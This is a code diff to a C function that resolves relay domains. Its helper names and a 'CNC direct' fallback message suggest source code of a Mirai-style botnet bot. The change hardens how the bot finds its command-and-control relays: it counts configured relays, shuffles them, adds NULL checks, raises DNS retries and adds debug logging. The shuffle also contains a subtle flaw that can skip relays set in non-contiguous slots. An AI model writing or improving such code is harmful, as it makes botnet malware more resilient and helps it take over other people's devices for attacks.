@@ -49,9 +49,29 @@ static void resolve_relay_addr(void)
 
     // Try all available relays in random order until one works
     int relay_order[4] = {0, 1, 2, 3};
+    int configured_relays = 0;
+    
+    // First, count how many relays are actually configured
+    for (int i = 0; i < 4; i++)
+    {
+        int idx = TABLE_RELAY_1 + i;
+        table_unlock_val(idx);
+        char *domain = table_retrieve_val(idx, NULL);
+        if (domain != NULL && util_strlen(domain) > 0)
+            configured_relays++;
+        table_lock_val(idx);
+    }
+    
+    if (configured_relays == 0)
+    {
+#ifdef DEBUG
+        printf("[relay] No relays configured, falling back to CNC direct\n");
+#endif
+        return;
+    }
     
     // Shuffle the relay order
-    for (int i = 3; i > 0; i--)
+    for (int i = configured_relays - 1; i > 0; i--)
     {
         int j = rand_next() % (i + 1);
         int tmp = relay_order[i];
@@ -59,21 +79,24 @@ static void resolve_relay_addr(void)
         relay_order[j] = tmp;
     }
     
-    for (int attempt = 0; attempt < 4; attempt++)
+    for (int attempt = 0; attempt < configured_relays; attempt++)
     {
         int relay_index = TABLE_RELAY_1 + relay_order[attempt];
         table_unlock_val(relay_index);
         char *relay_domain = table_retrieve_val(relay_index, NULL);
         
-        // Skip empty relay entries (domains that weren't configured)
-        if (util_strlen(relay_domain) == 0)
+        if (relay_domain == NULL || util_strlen(relay_domain) == 0)
         {
             table_lock_val(relay_index);
             continue;
         }
         
+#ifdef DEBUG
+        printf("[relay] Trying relay: %s\n", relay_domain);
+#endif
+        
         struct resolv_entries *entries = NULL;
-        int retries = 1;
+        int retries = 3;
         
         while (retries >= 0 && entries == NULL)
         {
@@ -93,12 +116,19 @@ static void resolve_relay_addr(void)
             srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
             srv_addr.sin_port = htons(RELAY_PORT);
             resolv_entries_free(entries);
+#ifdef DEBUG
+            printf("[relay] Connected to relay successfully\n");
+#endif
             return;
         }
         
         if (entries)
             resolv_entries_free(entries);
     }
+    
+#ifdef DEBUG
+    printf("[relay] All relays failed to resolve!\n");
+#endif
 }
 #endif
 
